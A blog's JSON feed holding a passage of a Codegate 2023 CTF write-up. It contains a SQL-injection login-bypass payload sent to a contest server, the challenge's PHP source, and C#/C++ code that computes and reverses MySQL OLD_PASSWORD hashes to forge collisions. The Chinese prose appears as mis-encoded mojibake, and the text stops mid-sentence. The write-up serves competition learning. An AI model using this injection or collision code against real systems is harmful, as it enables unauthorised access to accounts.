{
    "version": "https://jsonfeed.org/version/1",
    "title": "Cubic YÂ³ â€¢ All posts by \"ctf\" category",
    "description": "Notes, CTF, DIY, thoughts and waifus.\n\nI'm CubicYYY, an undergraduate student majoring in Computer Science at Zhejiang University.\nâ¤â¤â¤ CTF, toy projects, electric guitar\nâœ–âœ–âœ– Technological supremacy\n\nRÃ©sumÃ©ğŸ‘‰ [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/resume&target=resume.tex&command=xelatex).",
    "home_page_url": "http://cubicy.icu",
    "items": [
        {
            "id": "http://cubicy.icu/2023/08/29/CODEGATE2023/",
            "url": "http://cubicy.icu/2023/08/29/CODEGATE2023/",
            "title": "Codegate 2023 Partial Write-Up (Web/Misc)",
            "date_published": "2023-08-29T07:05:06.000Z",
            "content_html": "<h1 id=\"Codegate-2023-éƒ¨åˆ†Write-Up-Web-Misc\"><a href=\"#Codegate-2023-éƒ¨åˆ†Write-Up-Web-Misc\" class=\"headerlink\" title=\"Codegate 2023 éƒ¨åˆ†Write-Up (Web&#x2F;Misc)\"></a>Codegate 2023 éƒ¨åˆ†Write-Up (Web&#x2F;Misc)</h1><p>è¿™æ¬¡å»éŸ©å›½å‚åŠ äº†Codegate 2023çš„å†³èµ›ï¼æŠŠWebéƒ¨åˆ†çš„é¢˜è§£åœ¨æ­¤é‡Šå‡ºï¼Œå…¶ä»–æ¸¸è®°&#x2F;ç…§ç‰‡å¦å¼€ä¸€æ–‡ã€‚  </p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><p>æ²¡å’‹çœ‹ã€‚ä¼¼ä¹æ˜¯XSSç»•ç»•ã€‚</p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><p>æ˜¯çš„ï¼Œè¿™é¢˜å°±å«Pwnï¼ˆä¸ä¹‹ç›¸å¯¹çš„æ˜¯Pwnåˆ†ç±»é‡Œæœ‰é“é¢˜å«Webï¼‰<br>è§£æ³•ï¼šæ²¡å’‹çœ‹ã€‚åº”è¯¥æ˜¯æ¯”è¾ƒæ°´çš„ä¸€é¢˜ã€‚ç»å…¸æ•°ç»„ç»•è¿‡  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = <span class=\"string\">&quot;username[0]=\\\\&#x27; union select password from USER WHERE username=&#x27;admin&#x27; -- &amp;username[1]=2&amp;password=3&quot;</span></span><br><span class=\"line\">r = requests.post(<span class=\"string\">&quot;http://3.35.198.7:2929/login&quot;</span>, data=data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Chaâ€™s-magic\"><a href=\"#Chaâ€™s-magic\" class=\"headerlink\" title=\"Chaâ€™s magic\"></a>Chaâ€™s magic</h2><p>æºç ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">require_once <span class=\"string\">&#x27;config.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">function hashPasswordOld($password_to_hash)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $host, $dbname, $username, $password, $charset;</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $db = new PDO(<span class=\"string\">&quot;mysql:host=$host;dbname=$dbname;charset=$charset&quot;</span>, $username, $password);</span><br><span class=\"line\"></span><br><span class=\"line\">        $query = $db-&gt;prepare(<span class=\"string\">&quot;SELECT OLD_PASSWORD(:password)&quot;</span>);</span><br><span class=\"line\">        $query-&gt;execute([<span class=\"string\">&#x27;:password&#x27;</span> =&gt; $password_to_hash]);</span><br><span class=\"line\"></span><br><span class=\"line\">        $row = $query-&gt;fetch(PDO::FETCH_NUM);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($row)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $row[<span class=\"number\">0</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    catch(PDOException $ex)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;An Error occured!&lt;br&gt;&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset($_GET[<span class=\"string\">&quot;v1&quot;</span>]) &amp;&amp; isset($_GET[<span class=\"string\">&quot;v2&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $v1 = $_GET[<span class=\"string\">&quot;v1&quot;</span>];</span><br><span class=\"line\">    $v2 = $_GET[<span class=\"string\">&quot;v2&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (substr($v1, <span class=\"number\">0</span>, <span class=\"number\">13</span>) !== <span class=\"string\">&quot;codegate2023&#123;&quot;</span> || substr($v1, -<span class=\"number\">11</span>) !== <span class=\"string\">&quot;i_love_you&#125;&quot;</span> ||</span><br><span class=\"line\">        substr($v2, <span class=\"number\">0</span>, <span class=\"number\">13</span>) !== <span class=\"string\">&quot;codegate2023&#123;&quot;</span> || substr($v2, -<span class=\"number\">11</span>) !== <span class=\"string\">&quot;i_love_you&#125;&quot;</span>) &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;fall in love~&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v1 == $v2) die(<span class=\"string\">&quot;are you kidding me?&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $v1 = hashPasswordOld($v1);</span><br><span class=\"line\">    $v2 = hashPasswordOld($v2);</span><br><span class=\"line\">    $v3 = hashPasswordOld($flag);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v3 !== <span class=\"string\">&quot;6368616368613230&quot;</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;flag verification failed.&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v1 == null <span class=\"keyword\">or</span> $v2 == null)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;What the hell here?&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v1 == $v2)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($v2 == $v3)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            die($flag);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        die(substr($flag, <span class=\"number\">0</span>, strlen($flag) / <span class=\"number\">2</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    die(<span class=\"string\">&quot;Try harder...&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>ä¹Ÿå°±æ˜¯v1å’Œv2å’Œv3ç»è¿‡hashå¾—åˆ°çš„å€¼éƒ½ä¸€æ ·æ‰èƒ½æ‹¿åˆ°å®Œæ•´flagã€‚<br>å¯¹äºOLD_PASSWORDçš„ç®—æ³•ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå®ç°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªC#ç‰ˆæœ¬çš„ï¼š</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Online C# Editor for free</span></span><br><span class=\"line\"><span class=\"comment\">// Write, Edit and Run your C# code using C# Online Compiler</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">HelloWorld</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"built_in\">string</span> <span class=\"title\">mysql_old_password</span>(<span class=\"params\"><span class=\"built_in\">string</span> sPassword</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    UInt32[] result = <span class=\"keyword\">new</span> UInt32[<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"built_in\">bool</span> bDebug = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    UInt32 nr = (UInt32)<span class=\"number\">1345345333</span>, <span class=\"keyword\">add</span> = (UInt32)<span class=\"number\">7</span>, nr2 = (UInt32)<span class=\"number\">0x12345671</span>;</span><br><span class=\"line\">    UInt32 tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">char</span> [] password = sPassword.ToCharArray();</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; sPassword.Length; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (password[i] == <span class=\"string\">&#x27; &#x27;</span> || password[i] == <span class=\"string\">&#x27;\\t&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp = (UInt32)password[i];</span><br><span class=\"line\">        nr ^= (((nr &amp; <span class=\"number\">63</span>) + <span class=\"keyword\">add</span>) * tmp) + (nr &lt;&lt; <span class=\"number\">8</span>);</span><br><span class=\"line\">        nr2 += (nr2 &lt;&lt; <span class=\"number\">8</span> ) ^ nr;</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;---&quot;</span>);</span><br><span class=\"line\">        Console.WriteLine(nr.ToString(<span class=\"string\">&quot;X&quot;</span>));</span><br><span class=\"line\">        Console.WriteLine(nr2.ToString(<span class=\"string\">&quot;X&quot;</span>));</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;---&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">add</span> += tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    UInt32 mask = (((UInt32)<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">31</span>) - (UInt32)<span class=\"number\">1</span>); <span class=\"comment\">// 111....11, 31bits</span></span><br><span class=\"line\">    result[<span class=\"number\">0</span>] = nr &amp; mask;</span><br><span class=\"line\">    result[<span class=\"number\">1</span>] = nr2 &amp; mask;</span><br><span class=\"line\">    <span class=\"built_in\">string</span> hash = String.Format(<span class=\"string\">&quot;&#123;0:X&#125;&#123;1:X&#125;&quot;</span>, result[<span class=\"number\">0</span>], result[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hash.ToLower();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] args</span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Console.WriteLine (mysql_old_password(<span class=\"string\">&quot;aaaaa&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥çœ‹åˆ°ï¼Œv1å’Œv2çš„hashå€¼ç¢°æ’åªéœ€è¦åŠ å…¥ç©ºæ ¼å°±å¯ä»¥ï¼šå› ä¸ºè¯¥ç®—æ³•å®Œå…¨å¿½ç•¥ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ã€‚<br>è¿™æ ·å‰ä¸€åŠflagå°±çŸ¥é“äº†ï¼š<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP</code><br>æ ¸å¿ƒé—®é¢˜åœ¨äºä½¿v2çš„hashå€¼ç­‰äº<code>6368616368613230</code>ï¼Œv2å¿…é¡»ä»¥<code>i_love_you&#125;</code>ç»“å°¾ï¼Œæˆ‘ä»¬å”¯ä¸€èƒ½æ”¹å˜çš„å°±æ˜¯ä¸­é—´çš„å­—ç¬¦ä¸²ã€‚<br>ç»è¿‡æœå¯»ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¸–å­ï¼š<a href=\"https://security.stackexchange.com/questions/3133/mysql-old-password-cryptanalysis\">mysql-old-password-cryptanalysis</a><br>é‡Œé¢ç»™å‡ºäº†ä¸€æ®µé€†å‘æ¨å¯¼nrä¸nr2çš„ä»£ç ï¼Œä»¥åŠä¸€ç¯‡åˆ†æè¯¥ç®—æ³•çš„è®ºæ–‡ï¼šF. Muller and T. Peyrin â€œCryptanalysis of T-Function-Based Hash Functionsâ€ in International Conference on Information Security and Cryptology - ICISC 2006<br>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯è¯¥è®ºæ–‡ä¸­çš„ç®—æ³•å’Œå®é™…ç®—æ³•æœ‰ä¸€ä¸ªå¾®å°å·®å¼‚ï¼šnr2å¯¹åº”å…¬å¼çš„<code>=</code>åº”ä¸º<code>+=</code>ã€‚<br>é€†å‘è®¡ç®—nr&#x2F;nr2ï¼š</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">pre</span><span class=\"params\">(<span class=\"type\">int</span> level = <span class=\"number\">0</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; level; i++)</span><br><span class=\"line\">        cout &lt;&lt; <span class=\"string\">&quot;-&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">bruteforce</span><span class=\"params\">(<span class=\"type\">uint32_t</span> pnr, <span class=\"type\">uint32_t</span> pnr2, <span class=\"type\">uint32_t</span> add, <span class=\"type\">unsigned</span> len, <span class=\"comment\">/*debug only!*/</span> <span class=\"type\">unsigned</span> level = <span class=\"number\">0</span>)</span></span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> charset[] = <span class=\"string\">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;</span>; <span class=\"comment\">// sorted by ascii</span></span><br><span class=\"line\"><span class=\"comment\">//è¿™é‡Œçš„ä»£ç å‡è®¾åªæœ‰ä»¥ä¸Šå­—ç¬¦å­˜åœ¨ï¼Œäº‹å®ä¸Šå®Œå…¨æ²¡æœ‰å¿…è¦ï¼šascii 32-127éƒ½å¯ä»¥ã€‚</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">oldpw_rev</span><span class=\"params\">(<span class=\"type\">uint32_t</span> pnr, <span class=\"type\">uint32_t</span> pnr2, <span class=\"type\">uint32_t</span> add,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">              <span class=\"type\">unsigned</span> <span class=\"type\">char</span> c, <span class=\"type\">unsigned</span> len, <span class=\"comment\">/*debug only!*/</span> <span class=\"type\">unsigned</span> level = <span class=\"number\">0</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nr, nr2;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> u, e, y;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (len == <span class=\"number\">0</span> &amp;&amp; add==<span class=\"number\">7</span> &amp;&amp; pnr2==<span class=\"number\">0x12345671</span>) <span class=\"comment\">// Modify to target value when MiM-ing</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    nr = pnr;</span><br><span class=\"line\">    nr2 = pnr2;</span><br><span class=\"line\">    <span class=\"comment\">// c = cc[len - 1];</span></span><br><span class=\"line\">    add -= c;</span><br><span class=\"line\"></span><br><span class=\"line\">    u = nr2 - nr;</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    y = nr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (e = <span class=\"number\">0</span>; e &lt; <span class=\"number\">64</span>; e++)</span><br><span class=\"line\">    &#123; <span class=\"comment\">// guess 6 lsb of nr</span></span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> z, g;</span><br><span class=\"line\"></span><br><span class=\"line\">        z = (e + add) * c;</span><br><span class=\"line\">        g = (e ^ z) &amp; <span class=\"number\">0x3F</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (g == (y &amp; <span class=\"number\">0x3F</span>))</span><br><span class=\"line\">        &#123; <span class=\"comment\">// must matches, otherwise reject it</span></span><br><span class=\"line\">            <span class=\"type\">uint32_t</span> x;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Now 8 LSB of nr known, byte-by-byte derive previous nr</span></span><br><span class=\"line\">            x = e;</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">bruteforce</span>(nr, nr2, add, len - <span class=\"number\">1</span>, level + <span class=\"number\">1</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                cout&lt;&lt;<span class=\"string\">&quot;assume:&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">bruteforce</span><span class=\"params\">(<span class=\"type\">uint32_t</span> pnr, <span class=\"type\">uint32_t</span> pnr2, <span class=\"type\">uint32_t</span> add, <span class=\"type\">unsigned</span> len, <span class=\"comment\">/*debug only!*/</span> <span class=\"type\">unsigned</span> level)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (add<span class=\"number\">-7</span>&lt;<span class=\"number\">48</span>*len||add<span class=\"number\">-7</span>&gt;<span class=\"number\">122</span>*len) <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> _=<span class=\"number\">0</span>;_&lt;<span class=\"number\">63</span>;_++) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Maybeå‰ªæhere</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">oldpw_rev</span>(pnr,pnr2,add,charset[_],len,level)==<span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">pre</span>(level);</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;nr:%x   nr2:%x\\n&quot;</span>, pnr, pnr2);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//eg: aaaa</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> pnr = <span class=\"number\">0xA8D6917A</span>, pnr2 = <span class=\"number\">0x6FAB63E5</span>; <span class=\"comment\">//æœ€ç»ˆçš„nr, nr2ï¼Œæ¥è‡ªä¸Šæ–‡çš„C#ä»£ç </span></span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">bruteforce</span>(pnr, pnr2, <span class=\"number\">97</span>*<span class=\"number\">4</span> + <span class=\"number\">7</span> <span class=\"comment\">/*add*/</span>, <span class=\"number\">4</span><span class=\"comment\">/*length*/</span>) &lt;&lt; endl; <span class=\"comment\">// ! initial value of add is 7</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¹Ÿå°±æ˜¯ï¼Œåœ¨å·²çŸ¥addå€¼ï¼ˆå­—ç¬¦ä¸²çš„å‰ç¼€ASCIIå’Œï¼‰ä»¥åŠå½“å‰å­—ç¬¦çš„æƒ…å†µä¸‹ï¼Œå¯¹äºå¹³å‡¡æƒ…å†µï¼ˆæ— å¤šè§£ï¼‰ï¼Œèƒ½åœ¨å¸¸æ•°æ—¶é—´ç¡®å®šä¸Šä¸€ä¸ªnr&#x2F;nr2å¯¹çš„å€¼ã€‚<br>ä¸€ä¸ªæœ´ç´ çš„æ€è·¯æ˜¯æš´åŠ›æšä¸¾å½“å‰ä½çš„å­—ç¬¦ä¸addå€¼ã€‚<br>æš´åŠ›è®¡ç®—çš„è¯æ—¶é—´å¤æ‚åº¦è‚¯å®šæ˜¯æ— æ³•æ¥å—çš„ï¼ˆO(64^n)ï¼Œ5æ­¥éœ€è¦çº¦1åˆ†é’Ÿï¼‰ã€‚æˆ‘ä»¬ç†ä¸€ä¸‹ç°åœ¨å·²çŸ¥ä»€ä¹ˆï¼Œéœ€è¦æ±‚è§£ä»€ä¹ˆã€‚è¯·æ³¨æ„ï¼šæˆ‘ä»¬éœ€è¦çš„åªæ˜¯hashç¢°æ’ï¼Œä¸ä»£è¡¨flagä¹Ÿæ˜¯ä»¥<code>i_love_you&#125;</code>ç»“å°¾çš„ã€‚</p>\n<ul>\n<li>v2çš„å½¢å¼ï¼š<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&lt;???&gt;i_love_you&#125;</code></li>\n<li>FLAGçš„æ€»é•¿åº¦ä¸º78-79ï¼ˆå› ä¸ºå‰ä¸€åŠflagé•¿ä¸º39ï¼‰</li>\n<li>æœ€ç»ˆhash(v2)&#x3D;<code>6368616368613230</code> -&gt; æœ€ç»ˆçš„nr&#x2F;nr2</li>\n<li>å‰ä¸€åŠflagçš„addå€¼ä¸º3430ï¼š<code>sum([ord(i) for i in 